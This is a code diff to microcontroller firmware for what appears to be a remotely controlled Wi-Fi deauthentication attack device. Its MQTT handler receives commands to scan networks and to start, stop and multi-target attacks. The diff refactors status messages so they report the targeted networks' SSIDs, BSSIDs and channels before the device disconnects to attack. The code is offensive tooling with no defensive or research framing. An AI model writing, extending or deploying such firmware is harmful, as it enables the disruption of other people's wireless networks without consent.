@@ -2,7 +2,8 @@
 #include "attack_manager.h"
 #include "deauth.h"
 #include <HTTPClient.h>   // ✅ ADD
-#include <Update.h>       // ✅ ADD
+#include <Update.h>
+#include "definitions.h"       // ✅ ADD
 
 
 void MQTTHandler::begin() {
@@ -33,9 +34,10 @@ void MQTTHandler::callback(char* topic, byte* payload, unsigned int length,
         if (isRetained) mqtt.publish(TOPIC_CMD_RETAINED, "", true);
     }
     else if (msg == "status") {
-        Serial.println("📊 Status requested - sending...");
-        publishStatus(mqtt, attackModeActive ? "attacking" : "standby");
-    }
+    Serial.println("📊 Status requested - sending...");
+    publishStatus(mqtt, attackModeActive ? "attacking" : "standby", 
+                  attackModeActive ? "attacking" : "standby");
+}
     else if (msg == "scan") {
         Serial.println("🔍 Scan requested - scanning...");
         std::vector<ScannedNetwork> scanResults;
@@ -67,7 +69,7 @@ void MQTTHandler::callback(char* topic, byte* payload, unsigned int length,
 
 void MQTTHandler::handleStartAttack(PubSubClient& mqtt, bool& attackTriggered) {
     attackTriggered = true;
-    mqtt.publish(TOPIC_STATUS, "{\"status\":\"starting_attack\"}");
+    publishStatus(mqtt, "starting_attack", "attacking");  // ✅ Use publishStatus
     Serial.println("⚔️  ATTACK COMMAND RECEIVED!");
 }
 
@@ -77,10 +79,9 @@ void MQTTHandler::handleStopAttack(PubSubClient& mqtt, bool& attackTriggered,
     attackModeActive = false;
     attackPaused = false;
     stop_deauth();
-    mqtt.publish(TOPIC_STATUS, "{\"status\":\"stopped\",\"staying_connected\":true}");
+    publishStatus(mqtt, "stopped", "standby");  // ✅ Use publishStatus
     Serial.println("🛑 STOP received. Staying connected.");
 }
-
 void MQTTHandler::handleMultiAttack(PubSubClient& mqtt, const String& msg,
                                     std::vector<AttackTarget>& attackTargets,
                                     std::vector<AttackTarget>& savedAttackTargets,
@@ -124,22 +125,54 @@ void MQTTHandler::handleMultiAttack(PubSubClient& mqtt, const String& msg,
     savedAttackTargets = attackTargets;
     Serial.printf("   Targets: %d\n", attackTargets.size());
     
-    if (attackTargets.size() > 0) {
-        String statusMsg = "{\"status\":\"attacking\",\"mode\":\"multi_target\",\"targets\":" + 
-                          String(attackTargets.size()) + ",\"reason\":" + String(reason) + "}";
-        mqtt.publish(TOPIC_STATUS, statusMsg.c_str());
-        
-        mqtt.disconnect();
-        WiFi.disconnect(true);
-        delay(100);
-        
-        AttackManager::startAttack(attackTargets, reason);
-        attackModeActive = true;
-        attackTriggered = true;
-        lastReason = reason;
-        lastCheckTime = millis();
+  if (attackTargets.size() > 0) {
+    // ✅ Build and send attack status DIRECTLY with target info
+    DynamicJsonDocument doc(2048);
+    doc["device"] = DEVICE_ID;
+    doc["status"] = "attacking";
+    doc["mode"] = "multi_target";
+    doc["target_count"] = attackTargets.size();
+    doc["reason"] = reason;
+    doc["uptime"] = millis() / 1000;
+    doc["rssi"] = WiFi.RSSI();
+    doc["ip"] = WiFi.localIP().toString();
+    
+    JsonArray targets = doc.createNestedArray("targets");
+    for (const auto& t : attackTargets) {
+        JsonObject obj = targets.createNestedObject();
+        obj["ssid"] = t.ssid;
+        char bssidStr[18];
+        sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+                t.bssid[0], t.bssid[1], t.bssid[2],
+                t.bssid[3], t.bssid[4], t.bssid[5]);
+        obj["bssid"] = bssidStr;
+        obj["channel"] = t.channel;
     }
+    
+    String json;
+    serializeJson(doc, json);
+    
+    Serial.printf("   📤 Sending attack status: %s\n", json.c_str());
+    mqtt.publish(TOPIC_STATUS, json.c_str());
+    
+    // ✅ Flush MQTT - CRITICAL for delivery before disconnect
+    for (int i = 0; i < 20; i++) {
+        mqtt.loop();
+        delay(50);
+    }
+    
+    Serial.println("🔌 Disconnecting from MQTT and WiFi...");
+    mqtt.disconnect();
+    WiFi.disconnect(true);
+    delay(100);
+    
+    AttackManager::startAttack(attackTargets, reason);
+    attackModeActive = true;
+    attackTriggered = true;
+    lastReason = reason;
+    lastCheckTime = millis();
 }
+ }
 
 void MQTTHandler::handleRestart(PubSubClient& mqtt) {
     Serial.println("🔄 RESTART RECEIVED!");
@@ -148,7 +181,7 @@ void MQTTHandler::handleRestart(PubSubClient& mqtt) {
     
     for (int i = 0; i < 5; i++) { mqtt.loop(); delay(100); }
     
-    mqtt.publish(TOPIC_STATUS, "{\"status\":\"restarting\"}");
+    publishStatus(mqtt, "restarting");  // ✅ Use publishStatus
     mqtt.loop();
     delay(1000);
     ESP.restart();
@@ -194,7 +227,7 @@ void MQTTHandler::parseTargetString(const String& target,
 
 void MQTTHandler::publishStatus(PubSubClient& mqtt, const char* status,
                                 const char* mode, bool paused) {
-    DynamicJsonDocument doc(256);
+    DynamicJsonDocument doc(8192);
     doc["device"] = DEVICE_ID;
     doc["status"] = status;
     if (strlen(mode) > 0) doc["mode"] = mode;
@@ -202,6 +235,28 @@ void MQTTHandler::publishStatus(PubSubClient& mqtt, const char* status,
     doc["uptime"] = millis() / 1000;
     doc["rssi"] = WiFi.RSSI();
     doc["ip"] = WiFi.localIP().toString();
+    
+    // Add attack details if attacking
+    extern std::vector<TargetAP> multi_targets;
+    extern int deauth_type;
+    
+    if (deauth_type == DEAUTH_TYPE_MULTI && multi_targets.size() > 0) {
+        doc["attack_type"] = "multi_target";
+        doc["target_count"] = multi_targets.size();
+        
+        JsonArray targets = doc.createNestedArray("targets");
+        for (const auto& t : multi_targets) {
+            JsonObject obj = targets.createNestedObject();
+            obj["ssid"] = t.ssid;
+            
+            char bssidStr[18];
+            sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+                    t.bssid[0], t.bssid[1], t.bssid[2],
+                    t.bssid[3], t.bssid[4], t.bssid[5]);
+            obj["bssid"] = bssidStr;
+            obj["channel"] = t.channel;
+        }
+    }
     
     String json;
     serializeJson(doc, json);
